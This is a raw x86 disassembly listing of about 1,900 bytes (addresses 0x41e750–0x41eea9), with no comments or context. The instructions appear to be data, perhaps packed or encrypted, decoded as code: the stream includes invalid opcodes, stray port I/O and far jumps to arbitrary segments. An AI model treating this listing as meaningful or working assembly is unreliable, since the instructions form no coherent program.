  41e750:	mov    ds:0x28ddbbfd,al
  41e755:	cmp    ah,BYTE PTR [esi+0x31]
  41e758:	sub    al,cl
  41e75a:	and    bl,BYTE PTR [eax+0x1cb86b3b]
  41e760:	mov    bl,0xba
  41e762:	cmp    eax,DWORD PTR [ebx]
  41e764:	mov    ebp,0x252dc229
  41e769:	dec    ebx
  41e76a:	out    dx,al
  41e76b:	pop    ss
  41e76c:	inc    esp
  41e76d:	inc    ebp
  41e76e:	fs jne 0x41e7b1
  41e771:	aaa    
  41e772:	retf   
  41e773:	test   DWORD PTR ds:0x860a1522,esp
  41e779:	jno    0x41e708
  41e77b:	clc    
  41e77c:	jmp    0x2116:0xe8f42cdf
  41e783:	inc    esi
  41e784:	fild   WORD PTR [esi-0x3b]
  41e787:	push   esp
  41e788:	jnp    0x41e761
  41e78a:	pop    edx
  41e78b:	and    al,0x9f
  41e78d:	icebp  
  41e78e:	int    0x46
  41e790:	push   ebp
  41e791:	sbb    bh,BYTE PTR [eax-0x56ba7e8a]
  41e797:	sub    al,0x71
  41e799:	and    eax,0x94fad223
  41e79e:	jnp    0x41e768
  41e7a0:	fwait
  41e7a1:	mov    ch,BYTE PTR [eax+edx*8-0xa]
  41e7a5:	shl    BYTE PTR [esi+0x5c],cl
  41e7a8:	std    
  41e7a9:	lods   eax,DWORD PTR ds:[esi]
  41e7aa:	fsub   DWORD PTR [ecx]
  41e7ac:	loopne 0x41e819
  41e7ae:	cld    
  41e7af:	test   al,0x2f
  41e7b1:	dec    ecx
  41e7b2:	icebp  
  41e7b3:	mov    ecx,0x20b8706
  41e7b8:	call   0x8fb459bf
  41e7bd:	push   esi
  41e7be:	pop    ds
  41e7bf:	sbb    al,0x82
  41e7c1:	fwait
  41e7c2:	pop    ss
  41e7c3:	pop    ds
  41e7c4:	sub    ch,dl
  41e7c6:	imul   eax,DWORD PTR [edi+ebp*2+0x6d96b849],0x51
  41e7ce:	pop    ds
  41e7cf:	ja     0x41e7b8
  41e7d1:	jecxz  0x41e796
  41e7d3:	in     eax,0xa5
  41e7d5:	cwde   
  41e7d6:	test   al,0xb
  41e7d8:	scas   eax,DWORD PTR es:[edi]
  41e7d9:	mov    fs,WORD PTR [esi]
  41e7db:	fst    DWORD PTR [edi]
  41e7dd:	jmp    0x41e7b2
  41e7df:	xor    eax,0xf1aa21c
  41e7e4:	jle    0x41e7ed
  41e7e6:	inc    ecx
  41e7e7:	sub    eax,0x217f9425
  41e7ec:	retf   0x6dc6
  41e7ef:	adc    al,0x86
  41e7f1:	lds    esp,FWORD PTR ds:0x94011fb3
  41e7f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7f8:	in     eax,0x23
  41e7fa:	add    eax,0xd92d31f9
  41e7ff:	scas   eax,DWORD PTR es:[edi]
  41e800:	js     0x41e879
  41e802:	xchg   edi,eax
  41e803:	xor    eax,0xa89c15a2
  41e808:	ja     0x41e7c9
  41e80a:	lods   eax,DWORD PTR ds:[esi]
  41e80b:	add    al,0xbc
  41e80d:	push   ecx
  41e80e:	scas   al,BYTE PTR es:[edi]
  41e80f:	ja     0x41e824
  41e811:	add    cl,dh
  41e813:	adc    DWORD PTR [edi+0x45767f1f],ebx
  41e819:	inc    ebx
  41e81a:	push   0x55
  41e81c:	(bad)  [edx]
  41e81e:	lods   al,BYTE PTR ds:[esi]
  41e81f:	add    DWORD PTR [esi-0x5077d9c2],0xffffffff
  41e826:	xor    al,0x25
  41e828:	xor    DWORD PTR [eax+eiz*1-0x7d60e851],eax
  41e82f:	iret   
  41e830:	mov    eax,ds:0xb94fec87
  41e835:	shl    ah,0xa4
  41e838:	cmc    
  41e839:	mov    dl,BYTE PTR [esi-0x59bd7624]
  41e83f:	sub    bl,BYTE PTR [ebp-0x68]
  41e842:	fwait
  41e843:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e844:	mov    edi,0x4a165ef8
  41e849:	xchg   ebx,eax
  41e84a:	sub    bh,ah
  41e84c:	cmp    eax,0x93c7dc06
  41e851:	out    dx,al
  41e852:	cmp    ebp,ecx
  41e854:	sbb    eax,0x3100f8fb
  41e859:	je     0x41e81c
  41e85b:	jne    0x41e806
  41e85d:	je     0x41e8aa
  41e85f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e860:	or     esp,ecx
  41e862:	sbb    bl,BYTE PTR [ebp+0x65525441]
  41e868:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e869:	sub    al,0xa5
  41e86b:	dec    ecx
  41e86c:	dec    edx
  41e86d:	push   esp
  41e86e:	pop    esp
  41e86f:	scas   eax,DWORD PTR es:[edi]
  41e870:	jmp    0x41e8ea
  41e872:	shr    ebp,1
  41e874:	add    eax,0xdc3dd8ca
  41e879:	cmp    edi,DWORD PTR [ebx-0x21bc9c05]
  41e87f:	call   DWORD PTR [esi]
  41e881:	jle    0x41e86a
  41e883:	test   DWORD PTR [ebx],0x1ba2c1b7
  41e889:	sbb    eax,0xdd424619
  41e88e:	in     eax,0x62
  41e890:	jbe    0x41e826
  41e892:	cdq    
  41e893:	clc    
  41e894:	add    BYTE PTR [edi],0x5a
  41e897:	sub    al,0xff
  41e899:	mov    al,0xe7
  41e89b:	adc    eax,0xa2414a5
  41e8a0:	mov    al,BYTE PTR [esi+edi*1+0x5d37069]
  41e8a7:	fld    QWORD PTR [eax-0x25]
  41e8aa:	dec    esp
  41e8ab:	jbe    0x41e851
  41e8ad:	jno    0x41e8cc
  41e8af:	enter  0x814,0xe8
  41e8b3:	fbld   TBYTE PTR es:[esp+ebx*1+0x7f]
  41e8b8:	shl    ebx,1
  41e8ba:	ins    BYTE PTR es:[edi],dx
  41e8bb:	stos   DWORD PTR es:[edi],eax
  41e8bc:	mov    cl,0x6b
  41e8be:	jle    0x41e85d
  41e8c0:	(bad)  
  41e8c1:	xchg   ecx,eax
  41e8c2:	mov    ebp,0xc4076910
  41e8c7:	push   eax
  41e8c8:	mov    dh,ch
  41e8ca:	lea    esi,[ecx+0x77b9b0d7]
  41e8d0:	mov    WORD PTR [ebp-0x45],ss
  41e8d3:	mov    esp,0x5d51a73f
  41e8d8:	lods   eax,DWORD PTR ds:[esi]
  41e8d9:	cmp    ch,BYTE PTR [ebx]
  41e8db:	imul   edi,DWORD PTR [eax-0x58925a2c],0x83d3f9e8
  41e8e5:	pop    ss
  41e8e6:	mov    esp,0x9bf276e1
  41e8eb:	inc    edx
  41e8ec:	add    eax,0xbe21e42e
  41e8f1:	add    bh,BYTE PTR [ebp+0x70]
  41e8f4:	pop    esp
  41e8f5:	xchg   cl,bl
  41e8f7:	xor    eax,DWORD PTR [ecx]
  41e8f9:	leave  
  41e8fa:	xchg   ebp,eax
  41e8fb:	adc    BYTE PTR [esi+0x78],bl
  41e8fe:	push   ds
  41e8ff:	or     BYTE PTR [edx],bh
  41e901:	mov    dh,0x33
  41e903:	xor    DWORD PTR ss:[eax-0x58],esp
  41e907:	arpl   WORD PTR [eax+0x325f0e88],si
  41e90d:	push   ss
  41e90e:	jae    0x41e94b
  41e910:	hlt    
  41e911:	arpl   dx,cx
  41e913:	pop    ecx
  41e914:	xchg   ch,dl
  41e916:	rcr    DWORD PTR [edx+0x6],cl
  41e919:	gs cli 
  41e91b:	and    eax,ebx
  41e91d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e91e:	or     eax,0x93243589
  41e923:	pop    ss
  41e924:	int    0xa8
  41e926:	jbe    0x41e97a
  41e928:	or     BYTE PTR [esi+0x38],dl
  41e92b:	nop
  41e92c:	adc    dl,bl
  41e92e:	mov    cs,ebp
  41e930:	adc    bl,ah
  41e932:	cwde   
  41e933:	daa    
  41e934:	aam    0xc4
  41e936:	into   
  41e937:	push   ss
  41e938:	aas    
  41e939:	not    DWORD PTR [edx+ebp*1]
  41e93c:	fldenv [edi-0x1389e7a0]
  41e942:	jbe    0x41e95d
  41e944:	iret   
  41e945:	das    
  41e946:	lahf   
  41e947:	out    dx,al
  41e948:	bound  edx,QWORD PTR [edx]
  41e94a:	cmp    dl,BYTE PTR [edx-0x3f]
  41e94d:	push   ebx
  41e94e:	ror    edx,1
  41e950:	xor    DWORD PTR [eax],ecx
  41e952:	cld    
  41e953:	inc    esp
  41e954:	add    ecx,DWORD PTR [ebp-0x3d7fcef8]
  41e95a:	mov    dh,0x92
  41e95c:	scas   eax,DWORD PTR es:[edi]
  41e95d:	and    eax,DWORD PTR [edx+0x13]
  41e960:	out    dx,al
  41e961:	test   bh,cl
  41e963:	or     DWORD PTR [edi],ecx
  41e965:	call   0xeaaf:0xd4fec9d2
  41e96c:	fistp  WORD PTR [esi]
  41e96e:	pop    ecx
  41e96f:	inc    esp
  41e970:	mov    esi,0x271ab5ec
  41e975:	imul   edx,DWORD PTR [ebx-0xf139811],0xffffffb9
  41e97c:	scas   eax,DWORD PTR es:[edi]
  41e97d:	ds ds jmp 0x8cc6:0xa874a7e4
  41e986:	fsub   QWORD PTR [ecx]
  41e988:	xor    eax,0x63c8e160
  41e98d:	scas   eax,DWORD PTR es:[edi]
  41e98e:	scas   eax,DWORD PTR es:[edi]
  41e98f:	lahf   
  41e990:	arpl   WORD PTR [edi+0x6],dx
  41e993:	popa   
  41e994:	jmp    0x961:0xaf4cca36
  41e99b:	inc    edx
  41e99c:	aad    0x2c
  41e99e:	push   ss
  41e99f:	aam    0x92
  41e9a1:	inc    ebx
  41e9a2:	ja     0x41e985
  41e9a4:	dec    esi
  41e9a5:	sbb    eax,0x219feac5
  41e9aa:	add    bh,ah
  41e9ac:	lahf   
  41e9ad:	mov    esp,0xa50b7165
  41e9b2:	and    al,0x90
  41e9b4:	rol    BYTE PTR [edx],cl
  41e9b6:	sbb    WORD PTR [ebp-0x67],sp
  41e9ba:	push   esp
  41e9bb:	mov    dh,0xe6
  41e9bd:	pop    esi
  41e9be:	push   cs
  41e9bf:	sub    eax,0x7cdc472d
  41e9c4:	les    edi,FWORD PTR [ebp-0x5dd84e]
  41e9ca:	pop    eax
  41e9cb:	push   edi
  41e9cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9cd:	fadd   DWORD PTR [esi-0x1c]
  41e9d0:	xchg   esi,eax
  41e9d1:	mov    esp,0x35e7d73
  41e9d6:	je     0x41ea41
  41e9d8:	xor    eax,0xa21c5831
  41e9dd:	retf   
  41e9de:	or     BYTE PTR [edi],ah
  41e9e0:	std    
  41e9e1:	call   0x3d818c7e
  41e9e6:	scas   al,BYTE PTR es:[edi]
  41e9e7:	or     BYTE PTR [ecx-0x3c365401],ah
  41e9ed:	rcl    DWORD PTR [ebx],cl
  41e9ef:	push   cs
  41e9f0:	cdq    
  41e9f1:	and    BYTE PTR [esi],dh
  41e9f3:	leave  
  41e9f4:	push   0xd56998fd
  41e9f9:	inc    eax
  41e9fa:	add    ax,0xac50
  41e9fe:	adc    edx,DWORD PTR [esp+eax*2+0x5e]
  41ea02:	out    dx,al
  41ea03:	push   esp
  41ea04:	xchg   esi,eax
  41ea05:	cdq    
  41ea06:	call   0xfce17f2e
  41ea0b:	pushf  
  41ea0c:	mul    eax
  41ea0e:	out    0xbb,eax
  41ea10:	inc    eax
  41ea11:	int    0xfb
  41ea13:	aaa    
  41ea14:	bts    esi,ebx
  41ea17:	addr16 jp 0x41ea2e
  41ea1a:	cdq    
  41ea1b:	jbe    0x41ea6d
  41ea1d:	jmpw   0x2c33
  41ea21:	mov    al,ds:0xb4b88eeb
  41ea26:	shr    al,0x68
  41ea29:	fs mov esi,0xc10e86a8
  41ea2f:	into   
  41ea30:	sbb    eax,0xb432a967
  41ea35:	dec    esp
  41ea36:	xor    eax,0x18f71078
  41ea3b:	les    esp,FWORD PTR [esi]
  41ea3d:	sub    DWORD PTR [ecx+0x32],ecx
  41ea40:	hlt    
  41ea41:	in     al,0x89
  41ea43:	mov    ecx,0x3e317b1c
  41ea48:	out    0x8c,al
  41ea4a:	cmp    ecx,eax
  41ea4c:	ja     0x41ea2d
  41ea4e:	adc    BYTE PTR [ecx],bh
  41ea50:	data16 mov BYTE PTR [ecx-0x50],bh
  41ea54:	les    ebp,FWORD PTR [eax]
  41ea56:	xor    bl,BYTE PTR [eax-0xe]
  41ea59:	mov    eax,DWORD PTR [ebx]
  41ea5b:	xor    ecx,esi
  41ea5d:	xor    DWORD PTR [edi],esi
  41ea5f:	inc    ecx
  41ea60:	jl     0x41ea03
  41ea62:	fdivr  QWORD PTR [edx+edx*1-0x5f]
  41ea66:	out    dx,al
  41ea67:	int3   
  41ea68:	(bad)  
  41ea69:	dec    BYTE PTR [ebx]
  41ea6b:	lahf   
  41ea6c:	std    
  41ea6d:	push   es
  41ea6e:	stos   BYTE PTR es:[edi],al
  41ea6f:	bound  eax,QWORD PTR ds:0xbf964a3
  41ea75:	lods   al,BYTE PTR ds:[esi]
  41ea76:	mov    edx,0xcd0e0f2b
  41ea7b:	xor    ebx,DWORD PTR [edi+0x50]
  41ea7e:	mov    esp,0x3fcd0d4d
  41ea83:	xchg   ecx,eax
  41ea84:	mov    esi,0x8f91b9c5
  41ea89:	pop    eax
  41ea8a:	stc    
  41ea8b:	js     0x41eae6
  41ea8d:	add    eax,0xd346d4b0
  41ea92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea93:	cmc    
  41ea94:	(bad)  [eax+0x6d]
  41ea97:	sbb    eax,DWORD PTR [edx-0x3]
  41ea9a:	push   ecx
  41ea9b:	fsubr  st,st(0)
  41ea9d:	sbb    cl,BYTE PTR [edi]
  41ea9f:	fmul   QWORD PTR [edi+0x12c50c67]
  41eaa5:	push   0x66
  41eaa7:	fsub   DWORD PTR [edx]
  41eaa9:	cs mov cl,0xd9
  41eaac:	sub    BYTE PTR [ebp-0x32a98e82],0x52
  41eab3:	pop    esi
  41eab4:	cmp    ch,BYTE PTR [esi-0x7f070c95]
  41eaba:	out    dx,eax
  41eabb:	cmp    dl,BYTE PTR [esi+0x694fd1c3]
  41eac1:	mov    al,BYTE PTR [ebp+0x4a]
  41eac4:	aam    0x6b
  41eac6:	(bad)  
  41eac7:	cmp    bh,BYTE PTR [edx-0x308717bf]
  41eacd:	xor    bl,al
  41eacf:	stos   BYTE PTR es:[edi],al
  41ead0:	aad    0x1b
  41ead2:	and    eax,0x40f7317b
  41ead7:	xor    DWORD PTR [eax-0x7b],ecx
  41eada:	or     BYTE PTR [ebp-0x2cff66c4],bh
  41eae0:	(bad)
  41eae3:	cdq    
  41eae4:	test   DWORD PTR [esi],edi
  41eae6:	fbld   TBYTE PTR [esi-0x5d]
  41eae9:	test   eax,0x486ea2ab
  41eaee:	call   0xd7d28930
  41eaf3:	jmp    0x837a:0x5644b7a0
  41eafa:	xchg   ecx,eax
  41eafb:	scas   al,BYTE PTR es:[edi]
  41eafc:	fld    QWORD PTR [eax]
  41eafe:	push   edx
  41eaff:	inc    eax
  41eb00:	outs   dx,DWORD PTR ds:[esi]
  41eb01:	pop    ecx
  41eb02:	pop    edx
  41eb03:	enter  0xc607,0x3e
  41eb07:	cmp    al,0x33
  41eb09:	xchg   edx,eax
  41eb0a:	xor    ecx,DWORD PTR [eax+esi*8]
  41eb0d:	aaa    
  41eb0e:	sub    DWORD PTR [ebp+0x5a],ecx
  41eb11:	jmp    0xe26a:0xbb56fe30
  41eb18:	and    BYTE PTR [eax+edi*4],0x28
  41eb1c:	and    BYTE PTR [esi],dl
  41eb1e:	push   ds
  41eb1f:	in     al,0xbf
  41eb21:	fwait
  41eb22:	and    al,0xa1
  41eb24:	sub    al,0xd8
  41eb26:	or     al,0x1d
  41eb28:	data16 into 
  41eb2a:	inc    eax
  41eb2b:	out    dx,al
  41eb2c:	pop    ebx
  41eb2d:	scas   al,BYTE PTR es:[edi]
  41eb2e:	lahf   
  41eb2f:	arpl   WORD PTR [ebp-0x3],ax
  41eb32:	inc    eax
  41eb33:	pushf  
  41eb34:	pop    ss
  41eb35:	dec    BYTE PTR [eax-0x3e]
  41eb38:	sub    ch,bl
  41eb3a:	push   ebx
  41eb3b:	pop    es
  41eb3c:	inc    esp
  41eb3d:	retf   
  41eb3e:	sub    BYTE PTR [edx-0x45],cl
  41eb41:	cmp    al,0x93
  41eb43:	out    dx,eax
  41eb44:	add    edi,DWORD PTR [edi]
  41eb46:	es push es
  41eb48:	out    0x24,al
  41eb4a:	sti    
  41eb4b:	loope  0x41eb9c
  41eb4d:	xor    eax,0x3c3a003d
  41eb52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb53:	and    BYTE PTR [ebx+0x3cedd0d2],dl
  41eb59:	jb     0x41eb04
  41eb5b:	je     0x41ebad
  41eb5d:	loopne 0x41eb32
  41eb5f:	push   0x54
  41eb61:	rcl    BYTE PTR [eax+0x69881cb2],1
  41eb67:	add    dl,BYTE PTR [ebp+0xa1448e2]
  41eb6d:	add    al,0x89
  41eb6f:	pop    ecx
  41eb70:	jmp    0x41ebb7
  41eb72:	add    ah,bl
  41eb74:	mov    edi,0xe1ab501f
  41eb79:	sub    esp,edi
  41eb7b:	lea    eax,[edx-0x42]
  41eb7e:	sbb    eax,0x92c01d1e
  41eb83:	js     0x41ebd0
  41eb85:	push   cs
  41eb86:	fild   DWORD PTR [ecx]
  41eb88:	neg    DWORD PTR ds:0x63c73588
  41eb8e:	pop    es
  41eb8f:	xchg   esp,eax
  41eb90:	pushf  
  41eb91:	sub    BYTE PTR [ebp-0x15],ah
  41eb94:	rcr    DWORD PTR [ebp+0x11b2bfe8],cl
  41eb9a:	mov    ds:0x9ef5f805,al
  41eb9f:	in     al,dx
  41eba0:	cmp    eax,DWORD PTR [edi+0x59]
  41eba3:	adc    eax,edx
  41eba5:	(bad)  
  41eba6:	rcr    BYTE PTR [eax+0x12b36fcf],0x99
  41ebad:	add    al,0x42
  41ebaf:	js     0x41ebe7
  41ebb1:	dec    ecx
  41ebb2:	mov    ds:0x24234181,eax
  41ebb7:	jns    0x41ebd0
  41ebb9:	or     BYTE PTR [eax],0x31
  41ebbc:	adc    ebp,ebp
  41ebbe:	test   al,0x1a
  41ebc0:	das    
  41ebc1:	in     al,0xa6
  41ebc3:	mov    dh,0x78
  41ebc5:	dec    ebp
  41ebc6:	fstp   QWORD PTR [ebx]
  41ebc8:	fwait
  41ebc9:	nop
  41ebca:	jb     0x41ec4a
  41ebcc:	or     al,0x24
  41ebce:	xor    al,0x3
  41ebd0:	loopne 0x41eb70
  41ebd2:	ror    BYTE PTR [ecx+0x19],1
  41ebd5:	adc    eax,0x85298d84
  41ebda:	cmp    bh,BYTE PTR [ebp+0x7a5e722a]
  41ebe0:	and    eax,0x51f55a1c
  41ebe5:	je     0x41ec37
  41ebe7:	inc    edi
  41ebe8:	mov    ds,WORD PTR [esi+eax*1+0x7ecbd07b]
  41ebef:	jmp    0x9f7a:0x7f6d6d7f
  41ebf6:	into   
  41ebf7:	mov    bl,0x8d
  41ebf9:	or     eax,0x5c5b55b6
  41ebfe:	mul    DWORD PTR [ebp+0x6aa1e183]
  41ec04:	inc    esp
  41ec05:	xchg   edi,eax
  41ec06:	arpl   bx,bx
  41ec08:	cmc    
  41ec09:	not    DWORD PTR [esi+0x1de2c4c5]
  41ec0f:	jno    0x41ebf9
  41ec11:	sar    DWORD PTR [eax-0x21],0x3e
  41ec15:	sub    bl,BYTE PTR [esi]
  41ec17:	out    0x23,al
  41ec19:	xchg   esi,eax
  41ec1a:	adc    DWORD PTR [esi],esp
  41ec1c:	add    ch,BYTE PTR [edi+ebx*4]
  41ec1f:	scas   eax,DWORD PTR es:[edi]
  41ec20:	add    DWORD PTR [esi+0x3f5b46cb],0x2797071a
  41ec2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec2b:	je     0x41ec1d
  41ec2d:	pop    edx
  41ec2e:	arpl   WORD PTR [ebp+0x78],dx
  41ec31:	mov    ds:0xb4d8f90f,eax
  41ec36:	add    DWORD PTR [esi+0x1c],edi
  41ec39:	push   0x32
  41ec3b:	out    dx,eax
  41ec3c:	jl     0x41ec82
  41ec3e:	add    eax,0x51ac0694
  41ec43:	mov    ds:0x16592512,eax
  41ec48:	pop    DWORD PTR [edi+0x24]
  41ec4b:	cmp    al,ah
  41ec4d:	mov    BYTE PTR [ebx+ebx*4],ch
  41ec50:	xor    DWORD PTR [esi+edx*4+0x4797ebb1],eax
  41ec57:	in     eax,0x0
  41ec59:	add    eax,0xac2cf9b7
  41ec5e:	sub    eax,0x9ecb3e36
  41ec63:	mov    esp,0x980e45c3
  41ec68:	push   eax
  41ec69:	inc    ebx
  41ec6a:	(bad)  
  41ec6b:	mov    esp,0x101c343e
  41ec70:	sub    DWORD PTR [edx],ebp
  41ec72:	cwde   
  41ec73:	add    eax,ebx
  41ec75:	jmp    0xdc568544
  41ec7a:	mov    dh,0x2
  41ec7c:	pushf  
  41ec7d:	cli    
  41ec7e:	mov    DWORD PTR [ebx+0x6cb2f5d5],esp
  41ec84:	lds    ebx,FWORD PTR ds:0x15b8221b
  41ec8a:	push   edi
  41ec8b:	loop   0x41ec5e
  41ec8d:	mov    ebx,0xf5a33caa
  41ec92:	sbb    ebp,esi
  41ec94:	imul   esi,ecx,0xbbbb6c71
  41ec9a:	inc    edx
  41ec9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec9c:	sub    DWORD PTR [ebx-0x57],ebx
  41ec9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eca0:	sbb    bh,ah
  41eca2:	jle    0x41ed10
  41eca4:	sbb    bl,ch
  41eca6:	xchg   ebp,eax
  41eca7:	std    
  41eca8:	cli    
  41eca9:	call   0xa322:0x7a6b8fbd
  41ecb0:	or     eax,0x45bc2a5
  41ecb5:	cmp    ecx,DWORD PTR [edi+0x2e]
  41ecb8:	addr16 inc ebp
  41ecba:	neg    DWORD PTR [eax]
  41ecbc:	jmp    DWORD PTR [edx-0x54]
  41ecbf:	mov    ebx,0x4a67270a
  41ecc4:	sub    edx,ecx
  41ecc6:	cs cmp edx,ebp
  41ecc9:	pop    edx
  41ecca:	es push ebx
  41eccc:	inc    edi
  41eccd:	pop    ebp
  41ecce:	pop    ds
  41eccf:	pop    esi
  41ecd0:	inc    eax
  41ecd1:	outs   dx,BYTE PTR ds:[esi]
  41ecd2:	push   eax
  41ecd3:	inc    edi
  41ecd4:	cmc    
  41ecd5:	std    
  41ecd6:	push   ss
  41ecd7:	lock sbb esp,ecx
  41ecda:	int    0x0
  41ecdc:	add    BYTE PTR [ecx],dh
  41ecde:	int3   
  41ecdf:	cld    
  41ece0:	cdq    
  41ece1:	arpl   WORD PTR [ebp+0x42],si
  41ece4:	jns    0x41ec95
  41ece6:	mov    ebp,0xf4e7c0f8
  41eceb:	jo     0x41ecbd
  41eced:	xor    DWORD PTR [ecx],ebx
  41ecef:	rcr    BYTE PTR [edx-0x49980b45],1
  41ecf5:	js     0x41ed06
  41ecf7:	xor    ecx,edx
  41ecf9:	imul   edx,DWORD PTR [esp+esi*4],0x33
  41ecfd:	cmp    esp,DWORD PTR [esi-0x559e0e9d]
  41ed03:	and    cl,BYTE PTR [edx]
  41ed05:	mov    ecx,0x5f1ccd5a
  41ed0a:	ins    DWORD PTR es:[edi],dx
  41ed0b:	cs pop esp
  41ed0d:	adc    edx,DWORD PTR [esi+0x10]
  41ed10:	xchg   ecx,eax
  41ed11:	cmp    eax,0xc200c847
  41ed16:	sub    al,0x4c
  41ed18:	leave  
  41ed19:	cld    
  41ed1a:	mov    ebp,0xa6466941
  41ed1f:	sub    al,0xa6
  41ed21:	ret    0x62f9
  41ed24:	out    dx,al
  41ed25:	jp     0x41ecb9
  41ed27:	dec    esi
  41ed28:	sbb    BYTE PTR [edx+0x77],bh
  41ed2b:	xchg   esi,eax
  41ed2c:	xchg   ebx,eax
  41ed2d:	jle    0x41ed29
  41ed2f:	inc    esp
  41ed30:	mov    al,ds:0x631d96e6
  41ed35:	js     0x41ed72
  41ed37:	jns    0x41ed4c
  41ed39:	xor    edi,DWORD PTR [edx+ebp*4]
  41ed3c:	gs aaa 
  41ed3e:	add    al,0xe8
  41ed40:	mov    edx,DWORD PTR [edi+0x1a]
  41ed43:	jp     0x41ed28
  41ed45:	push   0xfffffffc
  41ed47:	bound  esp,QWORD PTR [ecx-0x1fba89ea]
  41ed4d:	mov    BYTE PTR [ebx-0x53],cl
  41ed50:	mov    dh,BYTE PTR ds:[ebx-0x58bfd9bf]
  41ed57:	cmp    al,0xbd
  41ed59:	xchg   ebx,eax
  41ed5a:	adc    BYTE PTR [ecx-0x25bff5ab],ah
  41ed60:	cmp    BYTE PTR [edi-0x78],bh
  41ed63:	(bad)
  41ed66:	add    eax,0xa9d6f9fa
  41ed6b:	push   es
  41ed6c:	jecxz  0x41ed21
  41ed6e:	in     eax,0x9e
  41ed70:	dec    esi
  41ed71:	push   esp
  41ed72:	mov    ah,BYTE PTR [edx-0xd]
  41ed75:	cmp    eax,0x23b4b325
  41ed7a:	mov    edx,0xa7504541
  41ed7f:	jns    0x41ed0c
  41ed81:	ror    DWORD PTR [edx],cl
  41ed83:	jp     0x41ed7b
  41ed85:	retf   
  41ed86:	jnp    0x41ed2f
  41ed88:	xchg   esp,eax
  41ed89:	es jmp 0xa15a80ac
  41ed8f:	cwde   
  41ed90:	xor    dl,ah
  41ed92:	sbb    DWORD PTR [edx-0x2c],edi
  41ed95:	dec    ecx
  41ed96:	test   BYTE PTR [esi],ch
  41ed98:	push   cs
  41ed99:	popf   
  41ed9a:	les    edx,FWORD PTR [ecx+0x5a]
  41ed9d:	pop    esi
  41ed9e:	inc    esp
  41ed9f:	div    BYTE PTR [eax+0x4e]
  41eda2:	or     al,0x5
  41eda4:	jo     0x41edda
  41eda6:	ret    
  41eda7:	cmp    al,0x94
  41eda9:	lods   eax,DWORD PTR ds:[esi]
  41edaa:	outs   dx,BYTE PTR ds:[esi]
  41edab:	sub    al,0xb0
  41edad:	jle    0x41edc6
  41edaf:	fwait
  41edb0:	dec    edx
  41edb1:	mov    edx,0xfe83c26d
  41edb6:	push   esp
  41edb7:	mov    dl,0xdc
  41edb9:	cmp    eax,0xacb77a5b
  41edbe:	fiadd  WORD PTR [ecx+edx*2+0x26d561d1]
  41edc5:	ds inc eax
  41edc7:	test   BYTE PTR [ebx+0x549e6fe1],ah
  41edcd:	jecxz  0x41ee23
  41edcf:	jb     0x41edcb
  41edd1:	mov    edx,0xa2b485f
  41edd6:	adc    DWORD PTR [ecx+0x56],ebp
  41edd9:	pop    ecx
  41edda:	pop    es
  41eddb:	dec    ecx
  41eddc:	xlat   BYTE PTR ds:[ebx]
  41eddd:	cli    
  41edde:	push   ecx
  41eddf:	dec    edx
  41ede0:	cli    
  41ede1:	ds cwde 
  41ede3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ede4:	cmp    BYTE PTR [edi],0xa1
  41ede7:	mov    edx,0x967b4b06
  41edec:	add    al,0xf8
  41edee:	ret    0xd007
  41edf1:	cmp    BYTE PTR [eax],bl
  41edf3:	mov    cl,0xa1
  41edf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edf6:	add    al,0xbe
  41edf8:	call   0x690:0x5dc93c55
  41edff:	push   ecx
  41ee00:	pop    ebp
  41ee01:	dec    esp
  41ee02:	imul   esi,eax,0x7971efb8
  41ee08:	adc    BYTE PTR [edi],0xca
  41ee0b:	shl    DWORD PTR [eax-0xd991aa9],cl
  41ee11:	(bad)  
  41ee12:	out    0x59,eax
  41ee14:	in     al,0x50
  41ee16:	sbb    al,0xbd
  41ee18:	stos   DWORD PTR es:[edi],eax
  41ee19:	push   edx
  41ee1a:	out    dx,al
  41ee1b:	mov    dh,0x50
  41ee1d:	call   0xa61ba5d7
  41ee22:	cmp    al,0xf
  41ee24:	dec    eax
  41ee25:	mov    edi,0x44e9e0cd
  41ee2a:	mov    ebx,0x5883e8a8
  41ee2f:	xchg   ebx,eax
  41ee30:	rcr    DWORD PTR [ebx],cl
  41ee32:	cdq    
  41ee33:	jecxz  0x41eddf
  41ee35:	retf   0x171b
  41ee38:	mov    edx,0x9b958122
  41ee3d:	fstp   DWORD PTR [ecx]
  41ee3f:	mov    dh,0xdf
  41ee41:	loope  0x41ee6d
  41ee43:	pop    eax
  41ee44:	and    ebp,edi
  41ee46:	not    BYTE PTR [ecx+ebp*8]
  41ee49:	pop    ebp
  41ee4a:	dec    ecx
  41ee4b:	push   edi
  41ee4c:	sbb    eax,0xac86c718
  41ee51:	or     eax,0x7e2a3bd7
  41ee56:	sar    BYTE PTR [edi+0x72102ab4],cl
  41ee5c:	mov    edx,0x5f08400b
  41ee61:	je     0x41ee0b
  41ee63:	mov    ch,0x5f
  41ee65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee66:	mov    ds:0xe10914c1,eax
  41ee6b:	push   ebp
  41ee6c:	lock js 0x41ee99
  41ee6f:	push   esi
  41ee70:	std    
  41ee71:	adc    al,ah
  41ee73:	xchg   DWORD PTR ds:0x3a55e621,esi
  41ee79:	mov    WORD PTR [ebx],gs
  41ee7b:	sbb    BYTE PTR [ebx+esi*1-0x77],al
  41ee7f:	test   eax,0x7edd4157
  41ee84:	jne    0x41ee88
  41ee86:	and    al,0x64
  41ee88:	mov    edi,0x8014aa07
  41ee8d:	imul   ecx,esp,0xfb9a17aa
  41ee93:	cmp    DWORD PTR [ebp-0x78],esi
  41ee96:	in     al,dx
  41ee97:	mov    eax,ds:0x86141bf
  41ee9c:	sahf   
  41ee9d:	(bad)  
  41ee9f:	scas   al,BYTE PTR es:[edi]
  41eea0:	test   BYTE PTR ds:0x77019e72,bh
  41eea6:	adc    BYTE PTR [ebx],0x7
  41eea9:	cmc    
